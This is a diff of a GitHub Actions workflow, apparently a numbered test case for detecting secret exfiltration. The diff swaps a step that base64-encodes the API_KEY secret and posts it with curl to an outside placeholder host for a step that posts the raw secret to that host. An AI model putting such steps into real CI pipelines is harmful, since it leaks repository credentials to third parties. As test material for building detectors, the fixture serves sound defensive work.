@@ -1,4 +1,4 @@
-name: B08-base64
+name: B06-variable-curl
 on: workflow_dispatch
 jobs:
   test:
@@ -7,5 +7,5 @@ jobs:
       API_KEY: ${{ secrets.API_KEY }}
     steps:
       - run: |
-          encoded=$(printf '%s' "$API_KEY" | base64)
-          curl --data "$encoded" https://example.invalid/collect
+          token="$API_KEY"
+          curl --data "$token" https://example.invalid/collect
